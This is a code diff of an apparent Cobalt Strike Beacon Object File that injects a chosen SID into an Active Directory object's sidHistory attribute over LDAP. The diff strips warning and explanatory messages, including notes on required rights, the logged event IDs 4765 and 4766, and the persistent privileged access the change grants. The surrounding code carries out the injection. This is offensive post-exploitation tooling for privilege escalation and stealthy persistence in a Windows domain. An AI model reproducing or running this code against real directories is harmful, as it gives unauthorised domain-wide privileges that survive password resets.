@@ -190,20 +190,8 @@ void go(char *args, int alen) {
     
     if (!sidSource || MSVCRT$strlen(sidSource) == 0) {
         BeaconPrintf(CALLBACK_ERROR, "[-] SID source is required");
-        BeaconPrintf(CALLBACK_ERROR, "[!] Can be: SID string (S-1-5-...), username, or DN");
         return;
     }
-    
-    BeaconPrintf(CALLBACK_OUTPUT, "");
-    BeaconPrintf(CALLBACK_OUTPUT, "[!] ========================================");
-    BeaconPrintf(CALLBACK_OUTPUT, "[!] WARNING: SID HISTORY INJECTION");
-    BeaconPrintf(CALLBACK_OUTPUT, "[!] ========================================");
-    BeaconPrintf(CALLBACK_OUTPUT, "[!] This is a HIGH-PRIVILEGE operation that:");
-    BeaconPrintf(CALLBACK_OUTPUT, "[!]   - Requires DS-Install-Replica rights or equivalent");
-    BeaconPrintf(CALLBACK_OUTPUT, "[!]   - May be logged extensively (Event ID 4765, 4766)");
-    BeaconPrintf(CALLBACK_OUTPUT, "[!]   - Can trigger security alerts");
-    BeaconPrintf(CALLBACK_OUTPUT, "[!]   - Provides persistent privileged access");
-    BeaconPrintf(CALLBACK_OUTPUT, "");
     
     BeaconPrintf(CALLBACK_OUTPUT, "[*] SID source: %s", sidSource);
     
@@ -242,7 +230,6 @@ void go(char *args, int alen) {
         targetDN = FindObjectDN(ld, targetIdentifier, searchBase);
         
         if (!targetDN) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to resolve target DN");
             BeaconPrintf(CALLBACK_ERROR, "[!] Target '%s' not found", targetIdentifier);
             if (defaultNC) MSVCRT$free(defaultNC);
             CleanupLDAP(ld);
@@ -250,12 +237,10 @@ void go(char *args, int alen) {
         }
     }
     
-    BeaconPrintf(CALLBACK_OUTPUT, "");
     
     // Display current state
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Current target object state:");
     DisplaySidHistory(ld, targetDN);
-    BeaconPrintf(CALLBACK_OUTPUT, "");
     
     // Determine SID to add
     BERVAL* sidToAdd = NULL;
@@ -263,7 +248,6 @@ void go(char *args, int alen) {
     
     // Check if sidSource is a string SID (starts with "S-")
     if (sidSource[0] == 'S' && sidSource[1] == '-') {
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Parsing string SID...");
         
         // Convert string SID to binary
         PSID binarySid = NULL;
@@ -364,14 +348,9 @@ void go(char *args, int alen) {
     
     if (result == LDAP_SUCCESS) {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully added SID to sidHistory!");
-        BeaconPrintf(CALLBACK_OUTPUT, "");
         if (sidString) {
             BeaconPrintf(CALLBACK_OUTPUT, "[+] Added SID: %s", sidString);
         }
-        BeaconPrintf(CALLBACK_OUTPUT, "");
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] The target object now has the privileges of the SID added");
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] This change persists across password resets");
-        BeaconPrintf(CALLBACK_OUTPUT, "");
         
         // Display updated state
         BeaconPrintf(CALLBACK_OUTPUT, "[*] Updated object state:");
@@ -417,6 +396,4 @@ cleanup:
     if (targetDN) MSVCRT$free(targetDN);
     if (dcHostname) MSVCRT$free(dcHostname);
     CleanupLDAP(ld);
-    
-    BeaconPrintf(CALLBACK_OUTPUT, "");
 }
